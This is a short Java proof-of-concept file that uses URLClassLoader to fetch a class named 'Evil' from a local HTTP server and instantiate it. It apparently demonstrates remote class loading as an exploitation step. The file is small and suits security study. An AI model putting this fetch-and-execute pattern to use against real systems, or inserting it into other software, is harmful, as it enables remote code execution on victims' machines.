package URLClassLoaderPoC;

import java.net.URL;
import java.net.URLClassLoader;

public class testURLClassLoader {
    public static void main(String[] args) throws Exception {
        URL url = new URL("http://127.0.0.1:9999/");
        URLClassLoader ucl = new URLClassLoader(new URL[]{url});
        Class calc = ucl.loadClass("URLClassLoaderPoC.Evil");
        calc.newInstance();
    }
}
